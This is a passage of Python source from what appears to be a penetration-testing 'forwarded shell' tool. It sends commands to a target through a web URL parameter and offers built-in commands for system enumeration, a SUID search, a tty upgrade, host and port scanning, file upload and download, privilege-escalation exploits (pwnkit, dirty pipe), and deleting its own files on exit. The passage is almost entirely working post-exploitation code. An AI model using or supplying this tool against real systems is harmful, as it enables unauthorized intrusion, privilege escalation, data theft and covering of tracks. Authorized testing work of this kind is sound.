                user = cleanHTML(user)
                user = user.split("echo $USER")[1][:-4].replace("\n", "").replace("\r", "")                
                clearOutput(url, parameter)
                
                execCommand(url, parameter, "hostname" + "\n")
                hostname = readCommand(url, parameter)
                hostname = cleanHTML(hostname)
                hostname = hostname.split("hostname")[1][:-4].replace("\n", "").replace("\r", "")                
                clearOutput(url, parameter)

        except:
            pass
        
        # Custom prompt
        if user == "root":
            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~# ")
        else:
            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~$ ")
        
        # Here check introduced commands
        if command_to_exec == "dfs-help" or command_to_exec == "help-dfs":
            print(c.YELLOW + "\nCommands\t\tDescription" + c.END)
            print(c.YELLOW + "--------\t\t-----------" + c.END)
            print(c.BLUE + "dfs-enum\t\tenumerate common things of the system (users, groups, system info...)" + c.END)
            print(c.BLUE + "dfs-binaries\t\tsearch common binaries that can be used in the pentest" + c.END)
            print(c.BLUE + "dfs-tty\t\t\tupgrade your shell with a interactive tty to have more power" + c.END)
            print(c.BLUE + "dfs-hostscan\t\tscan active hosts in a valid range (Example: 192.168.1)" + c.END)
            print(c.BLUE + "dfs-portscan\t\tscan 5000 ports over a ip (Example: 192.168.1.1)" + c.END)
            print(c.BLUE + "dfs-upload\t\tupload a file to the server" + c.END)
            print(c.BLUE + "dfs-download\t\tdownload the specified file from the server" + c.END)
            print(c.BLUE + "dfs-exploit\t\ttry to escalate privileges using some exploits (pwnkit, dirty pipe)" + c.END)
            print(c.BLUE + "dfs-exit\t\texit from the forwarded shell and delete created files on the target\n" + c.END)
        
        if command_to_exec == "dfs-tty" or command_to_exec == "tty-dfs":
            tty = 1
            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Creating tty for a fully interactive shell" + c.END)

            command_to_exec = """script /dev/null -c sh"""
            execCommand(url, parameter, command_to_exec + "\n")
            clearOutput(url, parameter)

            print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Shell upgraded successfully\n" + c.END)

        if command_to_exec == "dfs-enum" or command_to_exec == "enum-dfs":
            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Enumerating system, please wait a few seconds" + c.END)
            user, hostname, ip, uname, id_output, users, path, sudo_version = enumSys(url, parameter)

            raw_command = """timeout 13 bash -c 'find / \-perm -4000 2>/dev/null'"""
            suid = execCustomCommand(url, parameter, raw_command)

            user = cleanHTML(user)
            hostname = cleanHTML(hostname)
            ip = cleanHTML(ip)
            uname = cleanHTML(uname)
            id_output = cleanHTML(id_output)
            users = cleanHTML(users)
            path = cleanHTML(path)
            sudo_version = cleanHTML(sudo_version)
            suid = cleanHTML(suid)

            print(c.YELLOW + "\nInformation" + c.END)
            print(c.YELLOW + "-----------" + c.END)
            print(c.BLUE + "Current user: " + user.strip('\n') + c.END)
            print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
            print(c.BLUE + "Path: " + path.strip('\n') + c.END)
            print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
            print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
            print(c.BLUE + "Users in /home: " + users + c.END)
            if sudo_version:
                print(c.BLUE + "Sudo version: " + sudo_version.strip('\n') + c.END)
            else:
                print(c.BLUE + "Sudo version: Not found" + c.END)
            
            print(c.BLUE + "System info: " + uname + c.END) 
            print(c.YELLOW + "SUID Files" + c.END)
            print(c.YELLOW + "----------" + c.END)
            print(c.BLUE + suid + c.END)

            raw_command = """cat /proc/net/tcp | grep -v "sl" | awk '{print $3}' FS=":" | awk '{print $1}' | sort -u"""
            hex_ports = execCustomCommand(url, parameter, raw_command)
            hex_ports = cleanHTML(hex_ports)

            print(c.YELLOW + "Local ports" + c.END)
            print(c.YELLOW + "-----------" + c.END)
            for port in hex_ports.strip('\n').split('\n'):
                print(c.BLUE + str(int(port, 16)) + c.END)
            print('')
        
        if command_to_exec == "dfs-hostscan" or command_to_exec == "hostscan-dfs":
            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Provide a valid ip range" + c.END)
            print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Example: dfs-hostscan 192.168.1\n" + c.END)
            
        if command_to_exec == "dfs-portscan" or command_to_exec == "portscan-dfs":
            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Provide a valid ip" + c.END)
            print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Example: dfs-portscan 192.168.1.2\n" + c.END)

        try:
            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-hostscan":
                ip = command_to_exec.split(' ')[1]
                hostScan(url, parameter, ip)
        except:
            pass

        try:
            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-portscan":
                ip = command_to_exec.split(' ')[1]
                portScan(url, parameter, ip)
        except:
            pass

        if command_to_exec == "dfs-binaries" or command_to_exec == "binaries-dfs":
            binList = checkBinaries(url, parameter)
            binList = cleanHTML(binList)
            print(c.YELLOW + "\nUseful binaries" + c.END)
            print(c.YELLOW + "---------------" + c.END)
            print(c.BLUE + binList + c.END)

        if command_to_exec == "dfs-exploit" or command_to_exec == "exploit-dfs":
            tryExploits(url, parameter)

        # Upload panel and function
        if command_to_exec == "dfs-upload" or command_to_exec == "upload-dfs":
            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Example: dfs-upload file.txt" + c.END)
            print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] It doesn't work with binaries\n" + c.END)
        
        try:
            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-upload":
                file_to_upload = command_to_exec.split(' ')[1]
                uploadFile(url, parameter, file_to_upload)
        except:
            pass

        # Download panel and function
        if command_to_exec == "dfs-download" or command_to_exec == "download-dfs":
            print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Example: dfs-download /path/to/the/file" + c.END)
            print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] It doesn't work with binaries\n" + c.END)

        try:
            if command_to_exec.split(' ')[1] and command_to_exec.split(' ')[0] == "dfs-download":
                file_to_download = command_to_exec.split(' ')[1]
                downloadFile(url, parameter, file_to_download)
        except:
            pass

        if command_to_exec == "dfs-exit" or command_to_exec == "exit-dfs":
            removeFiles(url, parameter)
            print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!\n" + c.END)
            sys.exit(0)

        if command_to_exec not in customCommands and not command_to_exec.startswith("dfs-upload ") and not command_to_exec.startswith("dfs-download ") and not command_to_exec.startswith("dfs-hostscan ") and not command_to_exec.startswith('dfs-portscan '):
            # Execute especified command
            execCommand(url, parameter, command_to_exec + "\n")

            # Read command output
            resp = readCommand(url, parameter)

            # Print command output
            resp = cleanHTML(resp)

            # Check if tty is powered
            try:
                if tty == 1:
                    print("\n" + resp.strip('\n') + "\n")
            except:
                print(resp)

            # Clear the file of the output
            clearOutput(url, parameter)



